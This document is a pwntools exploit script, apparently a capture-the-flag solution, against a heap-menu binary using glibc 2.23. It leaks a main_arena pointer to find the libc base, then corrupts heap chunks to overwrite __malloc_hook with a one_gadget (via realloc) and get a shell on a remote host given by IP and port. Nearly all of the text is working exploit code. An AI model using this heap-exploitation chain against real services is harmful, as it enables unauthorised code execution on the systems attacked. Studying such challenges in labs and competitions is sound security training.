from pwn import *
context(arch='amd64', log_level='debug')
libc = ELF('./libc-2.23.so')
# libc = ELF('/home/hornos/Desktop/libc/libc6_2.23-0ubuntu3_amd64.so')
# libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')

libc_realloc_hook_addr = libc.symbols['__realloc_hook']
libc_malloc_hook_addr = libc.symbols['__malloc_hook']
# libc6_2.23-0ubuntu11.3_amd64
libc_one_gadgets = [[0x45226, 0x4527a, 0xf03a4, 0xf1247]]
# libc6_2.23-0ubuntu11.2_amd64
libc_one_gadgets.append([0x45226, 0x4527a, 0xf0364, 0xf1207])
# libc6_2.23-0ubuntu3_amd64
libc_one_gadgets.append([0x45206, 0x4525a, 0xef494, 0xf0897])
# ATTACHMENT
libc_one_gadgets.append([0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066])

def create(size, data):
	io.sendlineafter(b'Your choice :\n', b'1')
	io.sendlineafter(b'Size: \n', str(size).encode())
	io.sendafter(b'Data: \n', data)

def delete(index):
	io.sendlineafter(b'Your choice :\n', b'2')
	io.sendlineafter(b'Index: \n', str(index).encode())

def show():
	io.sendlineafter(b'Your choice :\n', b'3')

# io = process('./pwn')
io = remote('111.200.241.244', 65256)

create(0x100, b'deadbeef\n')
create(0x100, b'deadbeef\n')
create(0x68, b'deadbeef\n')
create(0x68, b'deadbeef\n')
create(0x100, cyclic(0xF0) + p64(0x100) + p64(0x11))	# Fake Chunk's size

delete(0)
delete(2)
delete(3)

create(0x68, cyclic(0x60) + p64(0x300))

delete(4)
create(0x100, b'deadbeef\n')

show()
io.recvuntil(b'1 : ')
main_arena_p88_addr = u64(io.recv(6) + b'\x00\x00')
main_arena_addr = main_arena_p88_addr - 88

print(hex(main_arena_addr))
print(hex(libc_malloc_hook_addr))

malloc_hook_addr = (main_arena_p88_addr & 0xFFFFFFFFFFFFF000) + (libc_malloc_hook_addr & 0xFFF)
print(hex(malloc_hook_addr))
libc_base = malloc_hook_addr - libc_malloc_hook_addr
realloc_hook_addr = libc_base + libc_realloc_hook_addr
realloc_addr = libc_base + libc.symbols['realloc']
# one_gadget_addr = libc_one_gadgets[0][1] + libc_base
one_gadget_addr = 0x4526a + libc_base
print(hex(realloc_addr))
print(hex(one_gadget_addr))

# next mission: change the value of realloc_hook
create(0x118, cyclic(0x100) + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23))
create(0x68, b'deadbeef\n')
# pause()
create(0x68, b'\x00' * 0xB + p64(one_gadget_addr) + p64(realloc_addr + 2) + b'\n')
# pause()
io.sendlineafter(b'Your choice :\n', b'1')
io.sendlineafter(b'Size: \n', b'1')

io.interactive()
